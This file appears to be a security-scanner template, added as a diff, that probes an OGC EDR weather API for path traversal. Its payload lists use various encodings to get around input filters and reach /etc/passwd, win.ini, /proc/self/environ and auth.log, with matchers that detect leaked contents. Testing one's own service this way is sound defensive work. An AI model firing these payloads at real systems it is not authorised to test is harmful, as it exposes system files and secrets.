@@ -1,0 +1,185 @@
+id: ogc-edr-path-traversal
+
+info:
+  name: OGC EDR API Path Traversal / Local File Inclusion
+  author: weather-wms-security
+  severity: high
+  description: |
+    Tests for path traversal vulnerabilities in EDR API parameters including:
+    - collectionId (path parameter - primary target)
+    - instanceId (path parameter)
+    - parameter-name (query parameter that might reference files)
+    - f (format parameter)
+    
+    Tests various encoding techniques to bypass input filters.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://ogcapi.ogc.org/edr/
+  tags: lfi,path-traversal,edr,ogc,api
+
+variables:
+  base_coords: "POINT(-104.5 39.5)"
+  base_param: "GUST"
+
+http:
+  # Path traversal in collectionId
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{payload}}"
+
+    payloads:
+      payload:
+        # Basic traversal
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        # Dotdot-slash variations
+        - "....//....//etc/passwd"
+        - "....//....//....//etc/passwd"
+        - "....//../....//../etc/passwd"
+        # URL encoded
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "%2e%2e/%2e%2e/etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        # Double URL encoded
+        - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+        - "..%252f..%252fetc%252fpasswd"
+        # Backslash (Windows)
+        - "..\\..\\..\\..\\windows\\win.ini"
+        # Mixed slashes
+        - "..%5c..%5c..%5c..%5cetc%5cpasswd"
+        # Null byte
+        - "../../../../etc/passwd%00"
+        - "../../../../etc/passwd%00.json"
+        # With valid prefix
+        - "hrrr-surface/../../../etc/passwd"
+        - "hrrr-surface/../../../../etc/passwd"
+        - "gfs/../../../../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+          - "daemon:[x*]:[0-9]+:[0-9]+"
+          - "nobody:[x*]:"
+          - "www-data:"
+
+      - type: word
+        words:
+          - "[extensions]"
+          - "for 16-bit app support"
+
+  # Path traversal in collectionId + position query
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{payload}}/position?coords={{base_coords}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "....//....//etc/passwd"
+        - "hrrr-surface/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in instanceId
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/hrrr-surface/instances/{{payload}}"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "....//....//etc/passwd"
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "latest/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in parameter-name
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/hrrr-surface/position?coords={{base_coords}}&parameter-name={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "GUST/../../../etc/passwd"
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in f (format) parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/hrrr-surface/position?coords={{base_coords}}&parameter-name={{base_param}}&f={{payload}}"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "CoverageJSON/../../../etc/passwd"
+        - "json/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Sensitive file enumeration via collectionId
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{payload}}"
+
+    payloads:
+      payload:
+        - "../../../../proc/self/environ"
+        - "../../../../proc/self/cmdline"
+        - "../../../../proc/version"
+        - "../../../../etc/hostname"
+        - "../../../../etc/issue"
+        - "../../../../var/log/auth.log"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "PATH="
+          - "HOME="
+          - "USER="
+          - "Linux version"
+          - "Ubuntu"
+          - "Debian"
+        condition: or
